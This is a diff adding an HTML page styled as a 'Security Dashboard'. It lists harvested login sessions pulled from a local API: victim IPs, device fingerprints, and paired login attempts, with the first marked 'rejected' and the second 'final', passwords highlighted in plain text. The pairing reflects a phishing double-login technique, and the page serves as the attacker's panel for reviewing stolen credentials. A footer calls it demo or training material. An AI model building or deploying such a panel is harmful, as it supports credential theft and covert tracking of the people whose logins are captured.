@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Security Dashboard • Captured Sessions</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #f8fafc;
+      --card-bg: #ffffff;
+      --text: #1e293b;
+      --text-light: #64748b;
+      --accent: #3b82f6;
+      --accent-light: #60a5fa;
+      --highlight: #8b5cf6;
+      --danger: #ef4444;
+      --success: #10b981;
+      --border: #e2e8f0;
+      --shadow: 0 10px 25px rgba(0,0,0,0.06);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 50px 20px;
+      line-height: 1.6;
+    }
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+    }
+    header {
+      text-align: center;
+      margin-bottom: 60px;
+      animation: fadeInDown 1s ease-out;
+    }
+    @keyframes fadeInDown {
+      from { opacity:0; transform: translateY(-30px); }
+      to { opacity:1; transform: translateY(0); }
+    }
+    h1 {
+      font-size: 3.2rem;
+      font-weight: 800;
+      color: var(--accent);
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      color: var(--text-light);
+      font-size: 1.3rem;
+      margin-bottom: 16px;
+    }
+    .count {
+      color: var(--accent-light);
+      font-size: 1.25rem;
+      font-weight: 600;
+    }
+    .card {
+      background: var(--card-bg);
+      border-radius: 16px;
+      margin-bottom: 32px;
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      transition: all 0.4s ease;
+      opacity: 0;
+      transform: translateY(30px);
+    }
+    .card.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .card:hover {
+      transform: translateY(-8px);
+      box-shadow: 0 20px 50px rgba(59,130,246,0.15);
+    }
+    .card-header {
+      padding: 24px 32px;
+      background: linear-gradient(90deg, #eff6ff, #dbeafe);
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: var(--accent);
+    }
+    .card-header:hover { background: linear-gradient(90deg, #dbeafe, #bfdbfe); }
+    .card-header i { transition: 0.4s; color: var(--accent); }
+    .card.active .card-header i { transform: rotate(180deg); }
+    .badge {
+      font-size: 0.95rem;
+      padding: 6px 16px;
+      border-radius: 999px;
+      margin-left: 16px;
+      font-weight: 600;
+    }
+    .badge-fp { background: var(--highlight); color: white; }
+    .badge-login { background: var(--accent); color: white; }
+    .card-body {
+      padding: 0 32px;
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.7s cubic-bezier(0.4,0,0.2,1), padding 0.5s;
+    }
+    .card.active .card-body { max-height: 2400px; padding: 32px 32px 40px; }
+    .meta {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 28px;
+      font-size: 1.05rem;
+      color: var(--text-light);
+    }
+    .attempts {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+      gap: 24px;
+      margin: 32px 0;
+    }
+    .attempt {
+      background: #f1f5f9;
+      border-radius: 12px;
+      padding: 20px;
+      border: 1px solid #e2e8f0;
+      transition: all 0.3s;
+    }
+    .attempt:hover {
+      border-color: var(--accent);
+      box-shadow: 0 8px 20px rgba(59,130,246,0.1);
+    }
+    .attempt-title {
+      font-size: 1.25rem;
+      font-weight: 700;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .attempt-1 .attempt-title { color: #f59e0b; }
+    .attempt-2 .attempt-title { color: var(--success); }
+    .detail {
+      display: grid;
+      grid-template-columns: 140px 1fr;
+      gap: 12px;
+      margin-bottom: 10px;
+      font-size: 0.98rem;
+    }
+    .label {
+      color: var(--text-light);
+      font-weight: 600;
+      text-transform: uppercase;
+      font-size: 0.9rem;
+    }
+    .value {
+      color: var(--text);
+      font-family: 'JetBrains Mono', monospace;
+      word-break: break-all;
+    }
+    .pass { color: var(--danger); font-weight: 700; }
+    .fp-section {
+      margin-top: 40px;
+      padding-top: 28px;
+      border-top: 1px solid #e2e8f0;
+    }
+    .fp-title {
+      color: var(--highlight);
+      font-size: 1.25rem;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+    .fp-detail .label { color: var(--highlight); }
+    .no-data {
+      text-align: center;
+      padding: 140px 20px;
+      color: var(--text-light);
+      font-size: 1.9rem;
+      border: 2px dashed #cbd5e1;
+      border-radius: 16px;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 100px;
+      color: #94a3b8;
+      font-size: 1.1rem;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <header>
+    <h1>Security Dashboard</h1>
+    <div class="subtitle">Captured Device Fingerprint & Login Attempts</div>
+    <div class="count" id="entryCount">Loading sessions...</div>
+  </header>
+
+  <div class="accordion" id="accordion"></div>
+
+  <div id="noData" class="no-data" style="display:none;">
+    <i class="fas fa-shield-halved" style="font-size:6rem; opacity:0.4; margin-bottom:30px; color:var(--accent);"></i><br>
+    No captured sessions yet
+  </div>
+
+  <div class="footer">Showing last 4 sessions • Auto-cleared • Demo / Training Purpose Only</div>
+</div>
+
+<script>
+async function loadData() {
+  try {
+    const res = await fetch('/api/last4');
+    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    const data = await res.json();
+
+    const acc = document.getElementById('accordion');
+    const noData = document.getElementById('noData');
+    const countEl = document.getElementById('entryCount');
+
+    const cnt = data.count || 0;
+    countEl.textContent = `${cnt} session${cnt !== 1 ? 's' : ''} captured`;
+
+    if (cnt === 0) { noData.style.display = 'block'; return; }
+
+    acc.innerHTML = '';
+
+    (data.entries || []).forEach((e, i) => {
+      const card = document.createElement('div');
+      card.className = 'card';
+      setTimeout(() => card.classList.add('visible'), 150 * i);
+
+      const src = (e.source || 'unknown').toLowerCase();
+      let badge = '<span class="badge badge-fp">Device Fingerprint</span>';
+      if (src.includes('login') || src.includes('combined')) badge = '<span class="badge badge-login">Login Session</span>';
+
+      let body = `
+        <div class="meta">
+          <span><strong>Time:</strong> ${e.time || '[n/a]'}</span>
+          <span><strong>IP:</strong> ${e.ip || '[n/a]'}</span>
+        </div>`;
+
+      // Combined login attempts
+      if (e.attempt1 && e.attempt2) {
+        const atts = [
+          { cls: 'attempt-1', title: 'Attempt 1 (rejected)', icon: 'fa-times-circle', data: e.attempt1 },
+          { cls: 'attempt-2', title: 'Attempt 2 (final)', icon: 'fa-check-circle', data: e.attempt2 }
+        ];
+
+        body += '<div class="attempts">';
+        atts.forEach(a => {
+          let h = `<div class="attempt ${a.cls}">
+            <div class="attempt-title"><i class="fas ${a.icon}"></i> ${a.title}</div>`;
+          for (const [k,v] of Object.entries(a.data || {})) {
+            let val = v || '[empty]';
+            if (k.toLowerCase() === 'password') val = `<span class="pass">${val}</span>`;
+            h += `<div class="detail"><div class="label">${k.toUpperCase()}</div><div class="value">${val}</div></div>`;
+          }
+          h += '</div>';
+          body += h;
+        });
+        body += '</div>';
+
+        if (e.combined_at) {
+          body += `<div class="detail" style="margin-top:24px;"><div class="label">Combined At</div><div class="value">${e.combined_at}</div></div>`;
+        }
+      }
+
+      // Fingerprint data (either merged or standalone)
+      let fpContent = '';
+      const fpFields = e.fingerprint || e; // fallback to root if not merged
+      for (const [k,v] of Object.entries(fpFields)) {
+        if (['time','ip','user_agent','referer','source','method','attempt1','attempt2','combined_at','fingerprint'].includes(k)) continue;
+        let d = v ?? '[missing]';
+        if (typeof v === 'object' && v !== null) d = JSON.stringify(v, null, 2);
+        fpContent += `<div class="detail fp-detail"><div class="label">${k.replace(/_/g,' ').toUpperCase()}</div><div class="value">${d}</div></div>`;
+      }
+
+      if (fpContent) {
+        body += `
+          <div class="fp-section">
+            <div class="fp-title"><i class="fas fa-fingerprint"></i> Device Fingerprint</div>
+            ${fpContent}
+          </div>`;
+      }
+
+      if (!body.includes('<div')) body = '<p style="text-align:center;padding:60px;color:#94a3b8;font-style:italic;">No detailed data captured</p>';
+
+      card.innerHTML = `
+        <div class="card-header">
+          <span>${e.time?.slice(11,19) || '??:??:??'} • ${e.ip || '?.?.?.?'}${badge}</span>
+          <i class="fas fa-chevron-down"></i>
+        </div>
+        <div class="card-body">${body}</div>
+      `;
+
+      card.querySelector('.card-header').onclick = () => card.classList.toggle('active');
+      acc.appendChild(card);
+    });
+
+  } catch (err) {
+    document.getElementById('accordion').innerHTML = `
+      <div class="no-data">
+        <i class="fas fa-shield-halved" style="font-size:6rem;color:var(--danger);opacity:0.6;margin-bottom:30px;"></i><br>
+        Failed to load data<br>
+        <small style="color:var(--danger);">${err.message}</small>
+      </div>`;
+  }
+}
+
+window.addEventListener('load', loadData);
+</script>
+</body>
+</html>
